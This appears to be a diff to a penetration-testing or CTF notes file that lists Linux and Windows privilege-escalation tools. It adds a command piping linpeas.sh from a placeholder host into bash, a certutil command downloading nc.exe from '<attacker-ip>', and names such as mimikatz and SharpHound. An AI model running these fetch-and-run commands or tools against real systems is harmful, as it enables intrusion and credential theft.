@@ -1,6 +1,6 @@
 LINUX BINARIES
 
-curl -L linpeas.sh | bash
+curl -L http://<myip>/linpeas.sh | bash
 
 wget cve.exe
 
@@ -8,3 +8,16 @@ wget linPEAS.exe
 
 
 WINDOWS BINARIES
+
+
+certutil -urlcache -split -f http://<attacker-ip>/nc.exe nc.exe
+
+winPEAS.exe
+
+PowerUp.ps1
+
+PowerView.ps1
+
+mimikatz.exe
+
+SharpHound.exe
